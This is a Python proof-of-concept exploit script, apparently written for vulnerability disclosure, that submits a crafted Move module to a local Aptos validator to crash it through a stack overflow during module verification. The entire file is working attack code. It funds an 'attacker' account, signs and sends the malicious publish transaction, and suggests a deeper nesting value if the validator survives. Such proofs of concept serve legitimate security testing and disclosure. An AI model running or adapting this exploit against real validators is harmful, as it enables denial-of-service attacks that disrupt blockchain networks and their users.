#!/usr/bin/env python3
"""
Submit the malicious module to a local Aptos validator to trigger a DoS crash.

Usage:
  1. Start local testnet:
       ./target/release/aptos node run-local-testnet --with-faucet --force-restart

  2. Build and generate the malicious module bytes:
       cargo run -p poc-constant-dos -- 60000 /tmp/poc.mv

  3. Submit (crashes the validator):
       python3 testsuite/poc-constant-dos/submit_poc.py /tmp/poc.mv

Dependencies: pip install aptos-sdk
"""

import sys
import asyncio
import os

try:
    from aptos_sdk.async_client import RestClient, FaucetClient
    from aptos_sdk.account import Account
    from aptos_sdk.transactions import (
        EntryFunction,
        TransactionArgument,
        TransactionPayload,
        SignedTransaction,
        RawTransaction,
        ModuleBundle,
        Module,
    )
    from aptos_sdk.bcs import Serializer
except ImportError:
    print("[!] aptos-sdk not installed. Run: pip install aptos-sdk")
    sys.exit(1)

NODE_URL    = "http://127.0.0.1:8080/v1"
FAUCET_URL  = "http://127.0.0.1:8081"


async def submit_malicious_module(module_bytes: bytes):
    rest_client   = RestClient(NODE_URL)
    faucet_client = FaucetClient(FAUCET_URL, rest_client)

    # Create and fund a throwaway account
    attacker = Account.generate()
    print(f"[*] Attacker account: {attacker.address()}")
    await faucet_client.fund_account(str(attacker.address()), 100_000_000)
    print("[*] Account funded via faucet")

    # Build ModuleBundle payload containing our malicious module
    # The validator will deserialize + verify each module in the bundle.
    # verify_module crashes inside sig_to_ty() before execution ever starts.
    serializer = Serializer()
    serializer.u32(1)                      # number of modules
    serializer.to_bytes()                  # placeholder

    # Use the REST API directly with raw BCS-encoded transaction
    ledger_info = await rest_client.get_ledger_information()
    chain_id    = ledger_info["chain_id"]
    seq_num     = await rest_client.get_account_sequence_number(attacker.address())

    # Build the transaction payload: ModuleBundle with our crafted bytecode
    payload = ModuleBundle([Module(module_bytes)])

    raw_txn = RawTransaction(
        sender=attacker.address(),
        sequence_number=seq_num,
        payload=TransactionPayload(payload),
        max_gas_amount=10_000,
        gas_unit_price=100,
        expiration_timestamps_secs=int(asyncio.get_event_loop().time()) + 600,
        chain_id=chain_id,
    )

    signed_txn = attacker.sign_transaction(raw_txn)

    print("[*] Submitting publish_module transaction with malicious constant...")
    print("[*] The validator should crash (SIGSEGV / stack overflow) while verifying the module.")
    print("[*] Watch the validator process output / check if it exits unexpectedly.")

    try:
        txn_hash = await rest_client.submit_bcs_transaction(signed_txn)
        print(f"[?] Transaction submitted: {txn_hash}")
        print("[?] If the validator is still running, the depth may be too shallow.")
        print("[?] Try increasing depth: cargo run -p poc-constant-dos -- 80000 /tmp/poc.mv")
    except Exception as e:
        print(f"[*] Connection error (validator may have crashed): {e}")

    await rest_client.close()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <poc.mv>")
        sys.exit(1)

    module_path = sys.argv[1]
    if not os.path.exists(module_path):
        print(f"[!] File not found: {module_path}")
        sys.exit(1)

    with open(module_path, "rb") as f:
        module_bytes = f.read()

    print(f"[*] Loaded module: {len(module_bytes)} bytes from {module_path}")
    asyncio.run(submit_malicious_module(module_bytes))
